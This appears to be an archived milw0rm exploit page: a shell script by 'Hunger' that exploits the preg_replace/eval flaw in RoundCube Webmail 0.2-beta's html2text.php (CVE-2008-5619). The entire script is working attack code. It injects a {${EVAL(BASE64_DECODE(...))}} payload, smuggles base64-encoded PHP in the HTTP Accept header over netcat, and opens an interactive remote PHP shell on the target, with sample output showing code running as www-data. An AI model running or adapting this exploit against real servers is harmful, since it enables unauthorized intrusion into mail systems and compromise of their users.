<html><head><title>RoundCube Webmail <= 0.2b Remote Code Execution Exploit</title></head><pre>#!/bin/sh
#
# I was hoping the PoC would not appear so soon,
# but now that it is out,
# i thought i might as well publish my real exploit.
#
# Hunger
#
#
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5619
#
# FOR LEARNING PURPOSES ONLY!
#
# PHP&gt; echo(ini_get('disable_functions'));
#
# exec, system
#
# PHP&gt; passthru(&quot;id; uname -a&quot;);
#
# uid=666(www-data) gid=666(www-data) groups=666(www-data)
# Linux mail 2.6.28 #0 Sun Jan 01 10:05:33 CET 2009 i686 GNU/Linux
#

echo  'Exploit for Roundcube Webmail =&lt; 0.2-beta'
echo  'html2text.php / preg_replace() / eval bug'
echo -e '\r\nby Hunger &lt;rch2tex@hunger.hu&gt;\r\n\n'

if [ &quot;$2&quot; = &quot;&quot; ]; then echo &quot;
Usage:
$0 &lt;hostname&gt; &lt;deeplink&gt;

Example:
\$ $0 localhost /roundcube/bin/html2text.php


For https sites use stunnel or socat!
&quot;; exit 1; fi

NETCATEXE=`which nc`
BASE64ENC=`which base64`

if [ &quot;$NETCATEXE&quot; = &quot;&quot; ] || [ &quot;$BASE64ENC&quot; = &quot;&quot; ]; 
then
   echo &quot;Required tool(s) missing... (netcat, base64)&quot;
   exit 2
fi

USERAGENT=&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2)&quot;

MYPAYLOAD=&quot;{\${EVAL(BASE64_DECODE(\$_SERVER[HTTP_ACCEPT]))}}&quot;
EVALEDTAG=&quot;&lt;b&gt;&quot;
EVALEDTAG=$EVALEDTAG$MYPAYLOAD
EVALEDTAG=$EVALEDTAG&quot;&lt;/b&gt;&quot;

PARAMSIZE=54

HOST_NAME=$1
DEEP_LINK=$2
HTTP_PORT=80

HTTPHEADR=&quot;&quot;
HTTPHEADR=$HTTPHEADR&quot;POST $DEEP_LINK HTTP/1.0\r\n&quot;
HTTPHEADR=$HTTPHEADR&quot;Host: $HOST_NAME\r\n&quot;
HTTPHEADR=$HTTPHEADR&quot;User-Agent: $USERAGENT\r\n&quot;
HTTPHEADR=$HTTPHEADR&quot;Content-length: $PARAMSIZE\r\n&quot;
HTTPHEADR=$HTTPHEADR&quot;Accept:&quot;

SPLOITCHK='Succeeded! :))'
PHPAYLOAD='echo(&quot;'
PHPAYLOAD=$PHPAYLOAD$SPLOITCHK'\r\n\r\n'
PHPAYLOAD=$PHPAYLOAD'Type PHP functions as shell commands. ;)\r\n'
PHPAYLOAD=$PHPAYLOAD'Use \&quot;exit\&quot; to close session.\r\n\r\n'
PHPAYLOAD=$PHPAYLOAD'Good luck and have phun! ;D\r\n\r\n'
PHPAYLOAD=$PHPAYLOAD'&quot;)'

HTTPOKMSG=&quot;HTTP/1.0 200 OK&quot;
HTTP1KMSG=&quot;HTTP/1.1 200 OK&quot;
RETURNCHR=`echo -e &quot;\r\n&quot;`

echo -n &quot;Trying to exploit... &quot;

f=0; until [ &quot;$PHPAYLOAD&quot; = &quot;exit&quot; ]; do
 PHPAYLOAD=`echo &quot;$PHPAYLOAD;&quot; |$BASE64ENC --wrap=0`
 HTTP_SEND=&quot;$HTTPHEADR $PHPAYLOAD\r\n\r\n$EVALEDTAG&quot;
 HTTP_BACK=`echo -ne &quot;$HTTP_SEND&quot;|$NETCATEXE $HOST_NAME $HTTP_PORT`
 if [ $? != 0 ]; then echo &quot;Connection failed.&quot;; exit 3; fi
 e=0; l=0; echo &quot;$HTTP_BACK&quot; | while read i; do let l++;
   if [ $l = 1 ] &amp;&amp; [ &quot;$i&quot; != &quot;$HTTPOKMSG$RETURNCHR&quot; ] \
                 &amp;&amp; [ &quot;$i&quot; != &quot;$HTTP1KMSG$RETURNCHR&quot; ]; then
      echo &quot;Bad Server Response :\\&quot;; exit 4; fi;
   if [ $e = 1 ] &amp;&amp; [ $f = 0 ] &amp;&amp; [ &quot;$i&quot; = &quot;$MYPAYLOAD&quot; ]; then
      echo &quot;Target has been patched /o\\&quot;; exit 4; fi
   if [ $e = 1 ] &amp;&amp; [ $f = 0 ] &amp;&amp; [ &quot;$i&quot; != &quot;$SPLOITCHK$RETURNCHR&quot; ]; then
      echo -e &quot;Exploitation failed :((&quot;; exit 4; elif
         [ &quot;$i&quot; = &quot;$SPLOITCHK$RETURNCHR&quot; ]; then let f++; fi
   if [ $e -gt 0 ]; then echo &quot;$i&quot;; fi
   if [ &quot;$i&quot; = &quot;$RETURNCHR&quot; ]; then let e++; fi
 done
 if [ $? != 4 ]; then let f++; echo -ne &quot;PHP&gt; &quot;; else
  echo -e &quot;\n\nDump:\n\n$HTTP_BACK&quot;; exit 4; fi;
 read PHPAYLOAD
done

# milw0rm.com [2008-12-22]</pre></html>